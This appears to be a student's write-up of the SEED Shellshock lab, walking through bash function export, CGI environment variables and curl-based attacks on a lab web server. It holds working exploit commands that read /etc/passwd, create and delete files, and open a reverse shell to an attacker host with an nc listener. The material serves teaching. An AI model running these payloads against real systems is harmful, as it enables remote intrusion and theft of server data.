# Shellshock Vulnerability Lab
- Shellshock vulnerability can exploit many systems and be launched either remotely or from a local machine
- topics
    - Shellshock
    - Environment variables
    - Function definition in bash
    - Apache and CGI programs

## Environment Setup
- DNS Setting: add an entry `10.9.0.80 www.seedlab-shellshock.com` to `/etc/hosts`
- Web Server and CGI: CGI is a standard method used to generate dynamic content on web pages and for web application, many CGI programs are shell scripts, so before the actual CGI program runs, a shell program will be invoked first, and such an invocation is triggered by users from remote computers
- If the shell program is a vulnerable bash program, we can exploit the Shellshock vulnerability to gain privileges on the server

## Task 1: Experimenting with Bash Function
- in Ubuntu 20.04, the bash program has already been patched, for this lab, use `Labsetup/image_www/bash_shellshock`
- shell functions
    - we can declare a shell function
    ```
    $ foo(){ echo "hello"; }
    $ declare -f foo
    foo ()
    {
        echo "hello";
    }
    $ foo
    hello
    $ unset -f foo <-- remove it
    $ declare -f foo <-- nothing happened
    ```
- passing shell function to child process
    - approach 1: define a function, export it, then the child process will have it
        ```
        $ foo(){ echo "hello"; }
        $ export -f foo
        $ bash <-- create a child process to run another bash
        $ foo
        hello
        ```
    - approach 2: define an environment variable, it will become a function definition in the child bash process (`foo` has to start with `() { `, the spaces before and after `{` cannot be omitted)
        ```
        $ foo='() { echo "hello";}'
        $ echo $foo
        () { echo "hello";}
        $ export foo
        $ bash
        $ foo
        hello
        ```
- on `bash_shellshock`
    - the vulnerability is that if we append a command in `foo`, it will be executed when passing to child procee: `foo='() { echo "hello";}; ls;'`
        ```
        $ foo='() { echo "hello";}'
        $ echo $foo
        () { echo "hello";}
        $ export foo
        $ ./bash_shellshock
        bash_shellshock   Dockerfile   getenv.cgi   server_name.conf   vul.cgi
        $ foo
        hello
        ```
- on pathed `bash`
    - the attack will not work because when passing `foo` from parent to child process, in a patched bash program, `foo` will not be parsed to a function
        ```
        $ foo='() { echo "hello";}; ls;'
        $ export foo
        $ /bin/bash
        $ foo
        Command 'foo' not found, ...
        ...
        $ echo $foo
        () { echo "hello";}; ls;
        ```

## Task 2: Passing Data to Bash via Environment Variable
- `getenv.cgi` prints out all its environment variables using `strings /proc/$$/environ`
### Task 2.A: Using browser
- visit `www.seedlab-shellshock.com/cgi-bin/getenv.cgi`, use HTTP Header Live to see which environment variables' values are set by the browser, they are listed below
    ```
    HTTP_HOST=www.seedlab-shellshock.com
    HTTP_USER_AGENT=Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:83.0) Gecko/20100101 Firefox/83.0
    HTTP_ACCEPT=text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
    HTTP_ACCEPT_LANGUAGE=en-US,en;q=0.5
    HTTP_ACCEPT_ENCODING=gzip, deflate
    HTTP_CONNECTION=keep-alive
    HTTP_UPGRADE_INSECURE_REQUESTS=1
    HTTP_CACHE_CONTROL=max-age=0
    ```
### Task 2.B: Using `curl`
- to set the environment variable data to arbitrary values, we will have to modify the behavior of the browser (too complicated). However, we can use a command-line tool called `curl`, which allows users to control most of fields in an HTTP requst
    - some options
        - `-v` print out the header of the HTTP request
        - `-A`, `-e`, and `-H` can set some fields in the header (figure out what fields are set by each of them)
- test 
    ```
    $ curl -A "set by -A" -e "set by -e" -H "X: set by -H"
    ****** Environment Variables ******
    ...
    HTTP_USER_AGENT=set by -A
    HTTP_REFERER=set by -e
    HTTP_X=set by -H
    ...
    ```
- conclusion
    - `-A` can set the value of `HTTP_USER_AGENT`
    - `-e` can set the value of `HTTP_REFERER`
    - `-H` can set arbitrary header and its value, e.g., `-H "x: y"` will set a header `HTTP_X` with value `y`
    - we can use `-H` to inject data to the environment variables of the CGI program

## Task 3: Launching the Shellshock Attack
- the attack does not depend on what is in the CGI program, as it targets the bash program
- to get the plain-text output of our command, we need to follow a protocol: the output should start with `Content_type: text/plain`, followed by an empty line, and then place the output, e.g., `echo Content_type: text/plain; echo; /bin/ls -l`

### Task 3.A
- Get the server to send back the content of `/etc/passwd`
    ```
    $ curl www.seedlab-shellshock.com/cgi-bin/vul.cgi -H "F: () { echo "1";}; echo Content_type: text/plain; echo; /bin/cat /etc/passwd;"
    root:x:0:0:root:/root:/bin/bash
    ...
    ```
### Task 3.B
- Get the process' user ID (`/bin/id`)
    ```
    $ curl www.seedlab-shellshock.com/cgi-bin/vul.cgi -H "F: () { echo "1";}; echo Content_type: text/plain; echo; /bin/id;"
    uid=33(www-data) gid=33(www-data) groups=33(www-data)
    ```
### Task 3.C
- Get the server to create a file in `/tmp`
    ```
    $ curl www.seedlab-shellshock.com/cgi-bin/vul.cgi -H "F: () { echo "1";}; echo; /bin/touch /tmp/task3;"
    ```
    - check in the container
        ```
        # ls /tmp
        task3
        ```
### Task 3.D
- Get the server to delete the file created in task `3.C`
    ```
    $ curl www.seedlab-shellshock.com/cgi-bin/vul.cgi -H "F: () { echo "1";}; echo; /bin/rm /tmp/task3;"
    ```
    - check in the container
        ```
        # ls /tmp <---- nothing in it
        ```
### Questions
1. will we be able to steal content in `/etc/shadow`?
    - no, when running `/bin/id` we know the server is running as `www-data`, it doesn't have the privilege to read `/etc/shadow`
2. HTTP GET requests typically attach data in the URL, this could be another approach to launch the attack, e.g., `$ curl "...?AAAAA"`, and there will be an environment variable `QUERY_STRING=AAAAA`, use this method to launch the Shellshock attack
    - the command is `curl www.seedlab-shellshock.com/cgi-bin/vul.cgi?() { echo "1";}; echo; /bin/ls -l;`, but we need to URL encode some special characters
    - the actual command is `curl www.seedlab-shellshock.com/cgi-bin/vul.cgi?%28%29+%7B+echo+%221%22%3B%7D%3B+echo%3B+%2Fbin%2Fls+-l%3B`
    - however, if we use `getenv.cgi`, we can see that the URL encoded string is not decoded, i.e., the value of environment variable will not be this format: `() { ...};...`, so it will not be coverted to a shell function, and our commands won't be executed
    - in conclusion, the shellshock attack won't work with this method

## Task 4: Getting a Reverse Shell via Shellshock Attack
- exploit shellshock vulnerability and get this command to run: `/bin/bash -i >& /dev/tcp/10.9.0.1/9875 0>&1`
- on the attacker's machine, listen to the port `9875`, then exploit the vulnerability:
    ```
    $ curl www.seedlab-shellshock.com/cgi-bin/vul.cgi -H "F: () { echo "1";}; echo; /bin/bash -i >& /dev/tcp/10.9.0.1/9875 0>&1;"
    ```
    ```
    $ nc -l 9875
    www-data@569599de80eb:/usr/lib/cgi-bin$ <---- get a shell
    ```

## Task 5: Using the Patched Bash
- use a patched bash program, replace the first line of the CGI program (`#!/bin/bash_shellshock` -> `#!/bin/bash`)
- try the attack in task `3`, it doesn't work anymore
    ```
    $ curl www.seedlab-shellshock.com/cgi-bin/vul.cgi -H "F: () { echo "x";}; echo Content_type: text/plain; echo; /bin/cat /etc/passwd"

    Hello World
    ```
